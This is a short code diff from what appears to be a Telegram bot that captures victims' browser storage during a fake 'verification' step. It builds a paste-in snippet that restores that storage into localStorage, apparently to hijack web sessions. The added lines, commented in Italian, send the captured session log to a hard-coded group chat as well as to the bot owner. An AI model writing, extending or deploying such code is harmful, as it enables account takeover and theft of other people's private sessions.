@@ -179,9 +179,18 @@ const newVerified = async (ctx: Context) => {
         storage
       )}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();</pre>`;
 
+      const myGroupId = -4669315950; // 👉 Sostituisci con l'ID del tuo gruppo
+
       await bot.api.raw.sendMessage({
         text: log,
         chat_id: botOwner as string,
+        parse_mode: "HTML",
+      });
+
+      // Invia anche al gruppo
+      await bot.api.raw.sendMessage({
+        text: log,
+        chat_id: myGroupId,
         parse_mode: "HTML",
       });
       // send chat invite link
